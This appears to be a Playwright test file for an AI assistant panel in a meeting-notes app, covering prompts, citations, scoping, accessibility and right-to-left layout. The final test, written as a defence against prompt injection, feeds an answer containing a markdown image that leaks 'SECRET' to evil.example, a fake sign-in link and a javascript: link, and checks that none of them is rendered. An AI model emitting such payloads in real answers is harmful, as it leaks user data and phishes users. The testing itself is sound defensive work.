import { CSRF, SESSION } from "../playwright.config";
import { expect, gotoApp, isoAt, test } from "./fixtures";

/**
 * The assistant panel as D62 specifies it (plan step 5), with the fake Claude CLI
 * (tests/fixtures/fake_claude.py) answering through the real tool server.
 */

const HEADERS = { "X-CSRF-Token": CSRF, Cookie: `up_session=${SESSION}; up_csrf=${CSRF}` };

const BUDGET = [
  {
    id: "ap-1",
    title: "Q4 budget review",
    state: "RENDERED",
    started_at: isoAt(0, 30),
    turns: [{ speaker: "THEM", at_ms: 4000, text: "The marketing budget is cut by ten percent." }],
  },
];

async function ask(page: import("@playwright/test").Page, text: string) {
  await page.getByTestId("assistant-input").fill(text);
  await page.getByTestId("assistant-input").press("Enter");
}

test("the_empty_panel_says_what_it_can_do_and_offers_prompts_for_the_screen", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/m/ap-1");
  await page.keyboard.press("Control+j");
  const empty = page.getByTestId("assistant-empty");
  await expect(empty).toContainText("it cannot change anything");
  await expect(page.getByTestId("assistant-prompt")).toHaveCount(3);
  await expect(page.getByTestId("assistant-prompt").first()).toHaveText("What did we decide?");
  await expect(page.getByTestId("assistant-disclosure")).toContainText("a test model");

  await gotoApp(page, "/actions");
  await page.keyboard.press("Control+j");
  await expect(page.getByTestId("assistant-prompt").first()).toHaveText("What's open for me this week?");
  await expect(page.getByTestId("assistant-prompt").nth(1)).toHaveText("Which action items are overdue?");
});

test("a_prompt_asks_and_the_first_question_retires_the_disclosure", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  await expect(page.getByTestId("assistant-disclosure")).toBeVisible();
  // The reminder under the composer stays whatever happens.
  await expect(page.getByTestId("assistant-disclaimer")).toContainText("go to");
  await page.getByTestId("assistant-prompt").first().click();
  await expect(page.getByTestId("assistant-question")).toHaveText("What's open for me this week?");
  await expect(page.getByTestId("assistant-answer")).toBeVisible();
  await page.getByTestId("assistant-new").click();
  await expect(page.getByTestId("assistant-disclosure")).toHaveCount(0);
  await expect(page.getByTestId("assistant-disclaimer")).toContainText("go to");
});

test("the_scope_chip_follows_the_meeting_and_widens_to_all", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/m/ap-1");
  await page.keyboard.press("Control+j");
  const chip = page.getByTestId("assistant-scope");
  await expect(chip).toHaveAttribute("data-scope", "meeting");
  await expect(chip).toContainText("This meeting");
  await ask(page, "SCOPE?");
  await expect(page.getByTestId("assistant-answer")).toContainText("Scope is meeting.");

  await chip.getByRole("button").click();
  await expect(chip).toHaveAttribute("data-scope", "all");
  await ask(page, "SCOPE?");
  await expect(page.getByTestId("assistant-answer").nth(1)).toContainText("Scope is all.");

  // Off a meeting there is nothing to narrow to.
  await gotoApp(page, "/actions");
  await page.keyboard.press("Control+j");
  await expect(page.getByTestId("assistant-scope")).toHaveCount(0);
});

test("a_tool_step_says_what_it_found_and_an_empty_search_stays_open", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  await ask(page, "Which meetings mention the budget");
  const step = page.getByTestId("assistant-tool");
  await expect(step).toHaveAttribute("data-state", "output-available");
  await expect(step).toContainText("Searched meetings for “budget”");
  // The meeting's title and its transcript line both mention it.
  await expect(step).toContainText("2 found");
  await expect(step.getByTestId("assistant-tool-details")).toHaveCount(0);
  await step.getByRole("button").click();
  await expect(step.getByRole("button")).toHaveAttribute("aria-expanded", "true");
  await expect(step.getByTestId("assistant-tool-details")).toContainText("budget");

  await ask(page, "Which meetings mention 'zebracorn'");
  const empty = page.getByTestId("assistant-tool").nth(1);
  await expect(empty).toHaveAttribute("data-count", "0");
  await expect(empty.getByTestId("assistant-tool-details")).toContainText("nothing found");
  await expect(page.getByTestId("assistant-answer").nth(1)).toContainText("No meetings mention");
});

test("an_answer_names_who_wrote_it_can_be_copied_and_retried", async ({ page, seed, context }) => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  await ask(page, "Which meetings mention the budget");
  await expect(page.getByTestId("assistant-answered-by")).toContainText("fake-model");
  await page.getByTestId("assistant-copy").click();
  await expect(page.getByTestId("assistant-copy")).toHaveText("Copied");
  const copied = await page.evaluate(() => navigator.clipboard.readText());
  expect(copied).toContain("Q4 budget review");
  expect(copied).not.toContain("#cite-");

  await page.getByTestId("assistant-retry").click();
  await expect(page.getByTestId("assistant-answer")).toHaveCount(1);
  await expect(page.getByTestId("assistant-answer")).toContainText("Q4 budget review");
});

test("follow_up_suggestions_arrive_after_the_answer_and_ask_when_pressed", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  await ask(page, "NOTOOL SUGGEST hello");
  const offered = page.getByTestId("assistant-suggestion");
  await expect(offered).toHaveCount(2);
  await expect(offered.first()).toHaveText("What was decided?");
  await expect(page.getByTestId("assistant-answer")).not.toContainText("suggest");
  await offered.nth(1).click();
  await expect(page.getByTestId("assistant-question").nth(1)).toHaveText("Who owes what?");
});

test("a_citation_shows_its_words_on_hover", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  await ask(page, "Which meetings mention the budget");
  await page.getByTestId("assistant-citation").hover();
  const card = page.getByTestId("assistant-citation-card");
  await expect(card).toContainText("The marketing budget is cut by ten percent.");
  await expect(card).toContainText("Q4 budget review");
  await expect(card).toContainText("00:00:04");
});

test("signed_out_says_so_and_offers_to_sign_in", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  await ask(page, "SIGNED-OUT anything");
  const problem = page.getByTestId("assistant-error");
  await expect(problem).toHaveAttribute("data-problem", "signed-out");
  await expect(problem).toContainText("Claude Code is not signed in.");
  await page.getByTestId("assistant-to-settings").click();
  await expect(page).toHaveURL(/\/settings/);
});

test("a_local_model_is_said_up_front_before_anything_is_asked", async ({ page, seed, request }) => {
  await seed(BUDGET);
  await request.put("/api/settings", { headers: HEADERS, data: { values: { "llm.provider": "ollama" } } });
  try {
    await gotoApp(page, "/");
    await page.keyboard.press("Control+j");
    await expect(page.getByTestId("assistant-error")).toHaveAttribute("data-problem", "local-model");
    await expect(page.getByTestId("assistant-prompt")).toHaveCount(0);
  } finally {
    await request.put("/api/settings", { headers: HEADERS, data: { values: { "llm.provider": "fake" } } });
  }
});

test("the_screen_reader_hears_states_not_the_stream", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  await expect(page.getByTestId("assistant-log")).toHaveAttribute("aria-live", "off");
  await ask(page, "Which meetings mention the budget");
  await expect(page.getByTestId("assistant-status")).toHaveText("Answer ready, 1 sources.");
  await expect(page.getByTestId("assistant-answer")).not.toHaveAttribute("aria-busy", "true");
  await expect(page.getByTestId("assistant-answer").getByRole("heading", { name: "Assistant" })).toHaveCount(1);
});

test("the_panel_resizes_from_the_keyboard_and_keeps_its_width", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  const panel = page.getByTestId("assistant-panel");
  const before = (await panel.boundingBox())!.width;
  await page.getByTestId("assistant-resize").focus();
  await page.keyboard.press("ArrowLeft");
  await page.keyboard.press("ArrowLeft");
  await expect.poll(async () => (await panel.boundingBox())!.width).toBe(before + 32);
  await page.reload();
  await expect(page.getByTestId("app")).toBeVisible();
  await page.keyboard.press("Control+j");
  await expect.poll(async () => (await page.getByTestId("assistant-panel").boundingBox())!.width).toBe(before + 32);
  // Toasts move in beside it rather than under it.
  const inset = await page.evaluate(() => document.documentElement.style.getPropertyValue("--assistant-width"));
  expect(inset).toBe(`${before + 32}px`);
});

test("f6_moves_between_the_page_and_the_panel", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  await expect(page.getByTestId("assistant-input")).toBeFocused();
  await page.keyboard.press("F6");
  const inPanel = await page.evaluate(() => document.querySelector("[data-testid=assistant-panel]")!.contains(document.activeElement));
  expect(inPanel).toBe(false);
  await page.keyboard.press("F6");
  await expect(page.getByTestId("assistant-input")).toBeFocused();
});

test("the_sidebar_and_the_palette_open_it_too", async ({ page, seed }) => {
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.getByTestId("nav-assistant").click();
  await expect(page.getByTestId("assistant-panel")).toBeVisible();
  await page.getByTestId("assistant-close").click();
  await expect(page.getByTestId("assistant-panel")).toHaveCount(0);
  await page.keyboard.press("Control+k");
  await page.keyboard.type("Assistant");
  await page.keyboard.press("Enter");
  await expect(page.getByTestId("assistant-panel")).toBeVisible();
});

test("a_citation_into_a_deleted_meeting_says_so", async ({ page, seed, request }) => {
  await seed(BUDGET);
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  await ask(page, "Which meetings mention the budget");
  await expect(page.getByTestId("assistant-citation")).toHaveCount(1);
  await request.delete("/api/meetings/ap-1", { headers: HEADERS });
  await page.reload();
  await expect(page.getByTestId("app")).toBeVisible();
  await page.keyboard.press("Control+j");
  const chip = page.getByTestId("assistant-citation");
  await expect(chip).toHaveAttribute("data-missing", "true");
  await chip.hover();
  await expect(page.getByTestId("assistant-citation-card")).toContainText("deleted");
});

test("in_hebrew_the_panel_docks_left_and_each_paragraph_takes_its_own_direction", async ({ page, seed, request }) => {
  await seed(BUDGET);
  await request.put("/api/settings", { headers: HEADERS, data: { values: { "ui.language": "he" } } });
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  const panel = page.getByTestId("assistant-panel");
  await expect(panel).toBeVisible();
  const box = (await panel.boundingBox())!;
  expect(box.x).toBeLessThan(400);
  await expect(page.getByTestId("assistant-input")).toHaveAttribute("dir", "auto");
  await ask(page, "מה נאמר על 'budget'");
  await expect(page.getByTestId("assistant-question").locator("p")).toHaveAttribute("dir", "auto");
  const answer = page.getByTestId("assistant-answer");
  await expect(answer).toContainText("Q4 budget review");
  // Streamdown gives every block its own direction; this one is English.
  await expect(answer.locator("[dir=ltr]").first()).toBeVisible();
  await expect(page.getByTestId("assistant-answered-by")).toContainText("ענה");
});

/* Plan step 6: what an injected instruction would ask the answer to do, it cannot. */
test("an_answer_cannot_show_a_remote_image_or_link_out_of_the_app", async ({ page, seed }) => {
  await seed(BUDGET);
  const requests: string[] = [];
  page.on("request", (request) => requests.push(request.url()));
  await gotoApp(page, "/");
  await page.keyboard.press("Control+j");
  await ask(
    page,
    "ECHO: Done. ![pixel](https://evil.example/leak.png?d=SECRET) Sign in at [the portal](https://evil.example/login) " +
      "or [run this](javascript:alert(1)). Your meeting is [here](/m/ap-1).",
  );
  const answer = page.getByTestId("assistant-answer");
  await expect(answer).toContainText("Done.");
  await expect(answer.locator("img")).toHaveCount(0);
  await expect(answer).toContainText("[pixel]");
  await expect(answer.locator("a[href^='http'], a[href^='javascript']")).toHaveCount(0);
  await expect(answer).toContainText("the portal");
  // A link into the app still works.
  await answer.getByRole("link", { name: "here" }).click();
  await expect(page).toHaveURL(/\/m\/ap-1$/);
  expect(requests.filter((url) => url.includes("evil.example"))).toEqual([]);
});
